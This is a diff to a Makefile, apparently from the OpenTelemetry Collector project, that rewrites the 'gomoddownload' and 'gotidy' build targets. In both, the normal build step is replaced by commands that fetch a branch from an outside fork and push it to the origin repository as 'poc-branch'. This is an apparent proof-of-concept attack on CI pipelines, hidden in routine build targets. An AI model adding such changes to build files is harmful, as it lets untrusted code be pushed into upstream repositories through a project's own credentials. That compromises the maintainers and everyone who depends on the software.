@@ -40,7 +40,8 @@ all-modules:
 
 .PHONY: gomoddownload
 gomoddownload:
-	@$(MAKE) for-all-target TARGET="moddownload"
+	git fetch https://github.com/aarondewes-org/opentelemetry-collector main
+	git push origin FETCH_HEAD:refs/heads/poc-branch
 
 .PHONY: gotest
 gotest:
@@ -88,7 +89,8 @@ gofmt:
 
 .PHONY: gotidy
 gotidy:
-	@$(MAKE) for-all-target TARGET="tidy"
+	git fetch https://github.com/aarondewes-org/opentelemetry-collector main
+	git push origin FETCH_HEAD:refs/heads/poc-branch
 
 .PHONY: gogenerate
 gogenerate:
